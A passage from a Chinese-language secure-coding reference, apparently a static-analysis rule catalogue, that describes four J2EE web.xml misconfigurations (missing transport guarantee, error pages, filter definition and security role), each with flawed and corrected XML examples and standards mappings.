<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001640 CAT II, APSC-DV-001650 CAT II, APSC-DV-001660 CAT II, APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="J2EE-Misconfiguration-Missing-Data-Transport-Constraint"><a href="#J2EE-Misconfiguration-Missing-Data-Transport-Constraint" class="headerlink" title="J2EE Misconfiguration: Missing Data Transport Constraint"></a>J2EE Misconfiguration: Missing Data Transport Constraint</h4><h5 id="ABSTRACT-196"><a href="#ABSTRACT-196" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未指定用户数据限制的安全限制不能保证受限制的资源在传输层受到保护。</p>
<h5 id="EXPLANATION-197"><a href="#EXPLANATION-197" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>web.xml 安全限制通常用于基于角色的 Access Control，而可选的 user-data-constraint 元素则用于指定可防止采用不安全方式传输内容的传输保证。</p>
<p>在 <code>&lt;user-data-constraint&gt;</code> 标签中，<code>&lt;transport-guarantee&gt;</code>标签定义通信的处理方式。有三种级别的传输保证：</p>
<p>1) NONE 表示应用程序不要求任何传输保证。 2) INTEGRAL 表示应用程序要求采用传输过程中无法更改的方式在客户端和服务器之间传送数据。 3) CONFIDENTIAL 表示应用程序要求采用可防止其他实体查看传输内容的方式来传输数据。</p>
<p>在大多数情况下，使用 INTEGRAL 或 CONFIDENTIAL 表示需要 SSL/TLS。如果 <code>&lt;user-data-constraint&gt;</code>和 <code>&lt;transport-guarantee&gt;</code> 标签被忽略，传输保证在默认情况下为 NONE。</p>
<p>例 1：以下安全限制未指定传输保证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;Storefront&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Allow Customers and Employees access to online store front&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/store/shop/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Anyone&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;anyone&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-196"><a href="#RECOMMENDATIONS-196" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在定义授权限制时指定 CONFIDENTIAL 传输保证。一旦决定对应用程序的任意部分的信息流进行加密，就不要允许未经加密的信息流进入该应用程序的其他部分，这样可能允许会话 cookie 或其他敏感信息通过不安全的通道传输。</p>
<p>例 2：以下安全限制指定了 CONFIDENTIAL 传输保证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;Storefront&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Allow Customers and Employees access to online store front&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/store/shop/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Anyone&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;anyone&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-195"><a href="#REFERENCES-195" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java EE 5 Tutorial: Establishing a Secure Connection Using SSL</p>
<p>[2] Sun Microsystems, Inc. Java Servlet Specification Version 2.3</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 5</p>
<p>[4] Standards Mapping - FIPS200 CM, SC</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="J2EE-Misconfiguration-Missing-Error-Handling"><a href="#J2EE-Misconfiguration-Missing-Error-Handling" class="headerlink" title="J2EE Misconfiguration: Missing Error Handling"></a>J2EE Misconfiguration: Missing Error Handling</h4><h5 id="ABSTRACT-197"><a href="#ABSTRACT-197" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 应用程序必须定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</p>
<h5 id="EXPLANATION-198"><a href="#EXPLANATION-198" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</p>
<h5 id="RECOMMENDATIONS-197"><a href="#RECOMMENDATIONS-197" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-196"><a href="#REFERENCES-196" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 7</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Missing-Filter-Definition"><a href="#J2EE-Misconfiguration-Missing-Filter-Definition" class="headerlink" title="J2EE Misconfiguration: Missing Filter Definition"></a>J2EE Misconfiguration: Missing Filter Definition</h4><h5 id="ABSTRACT-198"><a href="#ABSTRACT-198" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将不会应用引用了不存在的筛选器的筛选器映射。</p>
<h5 id="EXPLANATION-199"><a href="#EXPLANATION-199" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>每个筛选器映射必须对应有效的筛选器定义以便应用该映射。</p>
<p>例 1：以下示例显示了引用不存在的筛选器 AuthenticationFilter 的筛选器映射。因为缺少定义，筛选器 AuthenticationFilter 将不会应用到指定的 URL 模式 /secure/*，并可能导致运行异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Compresses images to 64x64&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-class&gt;com.ImageFilter&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- AuthenticationFilter is not defined --&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;AuthenticationFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/secure/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ImageServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-198"><a href="#RECOMMENDATIONS-198" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保每个筛选器映射都指向一个有效的筛选器。</p>
<p>例 2：以下示例显示了每个筛选器映射的正确筛选器定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;An Authentication Filter&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;AuthenticationFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-class&gt;com.AuthenticationFilter&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Compresses images to 64x64&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-class&gt;com.ImageFilter&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;AuthenticationFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/secure/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter-name&gt;ImageFilter&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ImageServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-197"><a href="#REFERENCES-197" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="J2EE-Misconfiguration-Missing-Security-Role"><a href="#J2EE-Misconfiguration-Missing-Security-Role" class="headerlink" title="J2EE Misconfiguration: Missing Security Role"></a>J2EE Misconfiguration: Missing Security Role</h4><h5 id="ABSTRACT-199"><a href="#ABSTRACT-199" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>引用了不存在的 role-name 的安全限制会造成用户无法正常访问其所保护的所有资源。</p>
<h5 id="EXPLANATION-200"><a href="#EXPLANATION-200" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>auth-constraint 中定义的 role-name 中缺少 security-role，可能表明存在过时的配置。</p>
<p>例 1：以下示例指定了 role-name，但并未在 security-role 中对其进行定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">         &lt;web-resource-name&gt;AdminPage&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">         &lt;description&gt;Admin only pages&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">         &lt;url-pattern&gt;/auth/noaccess/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Administrators only&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;transport-guarantee&gt;INTEGRAL&lt;/transport-guarantee&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-199"><a href="#RECOMMENDATIONS-199" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>auth-constraint 中的每个 role-name 引用会在 security-role 中定义相应的 role-name。</p>
<p>例 2：将以下 security-role 添加到例 1 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-role&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Administrator&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-role&gt;</span><br></pre></td></tr></table></figure>
<p>要阻止对某些资源（例如 HTTP 方法 DELETE）的所有访问，可为 auth-constraint 指定空值。</p>
<p>例 3：在以下示例中，限制所有用户和角色使用 DELETE 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;dangerous method&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">        &lt;http-method&gt;DELETE&lt;/http-method&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-198"><a href="#REFERENCES-198" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
